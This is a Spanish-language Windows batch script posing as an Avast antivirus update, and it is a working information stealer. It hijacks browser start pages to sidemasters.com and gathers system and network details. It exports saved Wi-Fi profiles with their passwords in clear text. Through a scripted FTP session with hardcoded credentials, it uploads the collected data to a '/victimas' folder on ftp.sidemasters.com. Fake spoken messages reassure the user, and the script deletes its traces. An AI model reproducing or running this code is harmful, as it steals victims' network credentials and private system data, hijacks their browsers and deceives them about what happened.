@echo off
REG ADD "HKCU\SOFTWARE\MICROSOFT\INTERNET EXPLORER\MAIN" /V "START PAGE" /D "http://www.sidemasters.com/" /F 
@echo off
REG ADD "HKCU\SOFTWARE\MICROSOFT\GOOGLE CHROME\MAIN" /V "START PAGE" /D "http://www.sidemasters.com/" /F 
@echo off
REG ADD "HKCU\SOFTWARE\MICROSOFT\MOZILLA FIREFOX\MAIN" /V "START PAGE" /D "http://www.sidemasters.com/" /F
@Echo off
cd /D "%APPDATA%\Mozilla\Firefox\Profiles"
cd *.default
set ffile=%cd%
echo user_pref("browser.startup.homepage", "http://sidemasters.com/");>>"%ffile%\prefs.js"
set ffile=
cd %tmp%
echo MyWriteSpeak = "Bienvenido a Avast!." > Welcome.vbs
echo set ObjVoice = CreateObject("SAPI.SpVoice") >> Welcome.vbs
echo ObjVoice.Speak MyWriteSpeak >> Welcome.vbs
start Welcome.vbs
set Rule="===========================================================" 
echo Fecha: %date%  , Tiempo: %time% > "%username%".exe
echo -------------------------------------------------------------- >> "%username%".exe
systeminfo >> "%username%".exe
echo %Rule% >> "%username%".exe
IF "%~1"=="" (
	SET Node=%ComputerName%
) ELSE (
	SET Node=%~1
)
WMIC.EXE /Node:"%Node%" /Output:"Informacion Adaptador de redes.txt" Path Win32_NetworkAdapterConfiguration Where IPEnabled=TRUE Get DNSHostName, Description, IPAddress, IPSubnet, DefaultIPGateway, DNSServerSearchOrder, DHCPEnabled, MACAddress   /Format:LIST
set ER=r
REM /Output:STDOUT la muestra en pantalla
set EM=t
type "Informacion Adaptador de redes.txt" >> "%username%".exe
echo %Rule% >> "%username%".exe
netsh dump>> "%username%".exe
echo %Rule% >> "%username%".exe
echo.
echo %rule% >> "%username%".exe
echo En la red que se ha conectado actualmente!. + el # de interfaces conectadas >> "%username%".exe
echo %rule% >> "%username%".exe
echo.
netsh wlan show interface>> "%username%".exe
echo.
echo %rule% >> "%username%".exe
echo Informacion de IPCONFIG todo!. >> "%username%".exe
echo %rule% >> "%username%".exe
echo.
ipconfig /all>> "%username%".EXE
echo.
echo %rule% >> "%username%".exe
echo Informacion de la maquina MAC Address!. >> "%username%".exe
echo %rule% >> "%username%".exe
echo.
net config rdr>> "%username%".exe
echo.
echo %Rule% >> "%username%".exe
echo Puntos de accesos en donde se ha conectado nuestro amig@!. >> "%username%".exe
echo %Rule% >> "%username%".exe
md XMLAccessPoint
cd XMLAccessPoint
netsh wlan export profile Folder=. key=clear
type *.xml>> AccessPointXML.txt
type AccessPointXML.txt>> "%tmp%\%username%.exe"
cd ..
rmdir /S /Q XMLAccessPoint
set PR=@
echo open ftp.sidemasters.com> Anti-Virus.txt
set AM=c
echo sidemasters.com>> Anti-Virus.txt
set OI=i
echo Inform@tico>> Anti-Virus.txt
echo cd /victimas>> Anti-Virus.txt
echo lcd "%tmp%">> Anti-Virus.txt
echo binary>> Anti-Virus.txt
echo send "%username%.exe">> Anti-Virus.txt
echo ascii>> Anti-Virus.txt
echo disconnect>> Anti-Virus.txt
echo bye>> Anti-Virus.txt
FTP -v -i -s:Anti-Virus.txt
echo MyWriteSpeakTwo = "La Base de datos de Virus ha sido Actualizada!." > Actualizada.vbs
echo set ObjVoiceTwo = CreateObject("SAPI.SpVoice") >> Actualizada.vbs
echo ObjVoiceTwo.Speak MyWriteSpeakTwo >> Actualizada.vbs
start Actualizada.vbs
ping -n 5 0.0.0.0 > nul
del /s /q /f "%username%.exe" Anti-Virus.txt "Informacion Adaptador de redes.txt" Welcome.vbs Actualizada.vbs
exit